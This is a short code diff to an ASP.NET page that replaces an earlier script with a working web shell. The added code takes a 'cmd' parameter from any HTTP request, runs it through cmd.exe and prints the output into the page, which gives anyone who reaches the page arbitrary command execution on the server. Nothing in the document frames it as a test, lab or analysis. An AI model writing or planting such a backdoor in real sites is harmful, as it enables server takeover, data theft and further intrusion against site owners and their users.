@@ -1,9 +1,17 @@
 <%@ Page Language="C#" Debug="true" %>
 <%@ Import Namespace="System.Diagnostics" %>
-<script runat="server">
-  void Page_Load(object sender, EventArgs e) {
-    Response.Write("<pre>");
-    Response.Write(System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]).StandardOutput.ReadToEnd());
-    Response.Write("</pre>");
-  }
-</script>
+<%
+    string cmd = Request["cmd"];
+    if (cmd != null)
+    {
+        Process proc = new Process();
+        proc.StartInfo.FileName = "cmd.exe";
+        proc.StartInfo.Arguments = "/c " + cmd;
+        proc.StartInfo.UseShellExecute = false;
+        proc.StartInfo.RedirectStandardOutput = true;
+        proc.StartInfo.CreateNoWindow = true;
+        proc.Start();
+        string output = proc.StandardOutput.ReadToEnd();
+        Response.Write("<pre>" + output + "</pre>");
+    }
+%>
